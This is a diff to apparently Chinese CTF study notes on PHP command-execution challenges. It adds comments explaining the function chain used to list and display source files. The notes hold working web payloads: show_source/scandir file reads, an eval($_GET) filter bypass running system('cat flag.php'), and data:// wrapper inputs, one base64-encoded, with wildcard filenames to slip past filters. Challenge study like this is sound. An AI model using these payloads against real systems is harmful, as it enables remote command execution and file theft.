@@ -85,6 +85,25 @@ echo `nl fl''ag.php` // nl给每个输出加上行号
 c=echo scandir(".")[2]; //打印当前目录下的文件，第三个元素
 c=highlight_file(next(array_reverse(scandir(".")))); //查看当前目录下的文件，倒序后，取第二个元素，然后高亮显示
 c=show_source(next(array_reverse(scandir(pos(localeconv()))))); // 十分牛逼，localeconv的第一个元素是'.'，即当前目录，pos是current的别名，返回数组第一个元素，然后scandir读取当前目录，array_reverse倒序，next取下一个元素（即倒数第二个元素），show_source是highlight_file的别名显示源码
+// getcwd() 函数返回当前工作目录。它可以代替pos(localeconv())
+// localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回值为数组且第一项为"."
+// pos():输出数组第一个元素，不改变指针；
+// current() 函数返回数组中的当前元素（单元）,默认取第一个值，和pos()一样
+// scandir() 函数返回指定目录中的文件和目录的数组。这里因为参数为"."所以遍历当前目录
+// array_reverse():数组逆置
+// next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以
+// show_source():查看源码
+// pos() 函数返回数组中的当前元素的值。该函数是current()函数的别名。
+// 每个数组中都有一个内部的指针指向它的"当前"元素，初始指向插入到数组中的第一个元素。
+// 提示：该函数不会移动数组内部指针。
+// 相关的方法：
+// current()返回数组中的当前元素的值。
+// end()将内部指针指向数组中的最后一个元素，并输出。
+// next()将内部指针指向数组中的下一个元素，并输出。
+// prev()将内部指针指向数组中的上一个元素，并输出。
+// reset()将内部指针指向数组中的第一个元素，并输出。
+// each()返回当前元素的键名和键值，并将内部指针向前移动。
+
 
 c=eval($_GET[a]);&a=system('cat flag.php');//传入两个参数，c用于绕过校验，a才是真正的命令执行
 
@@ -100,4 +119,6 @@ encode/resource=flag.php
 //;base64: 这部分指定了数据的编码方式。在这个案例中，base64 表示数据是使用 Base64 编码的
 //PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=实际上是 <?php \nsystem("tac flag.php")\n?> 的base64编码
 c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=
+
+c=data://text/plain,<?php system("tac fl*g.php")?>
 ```
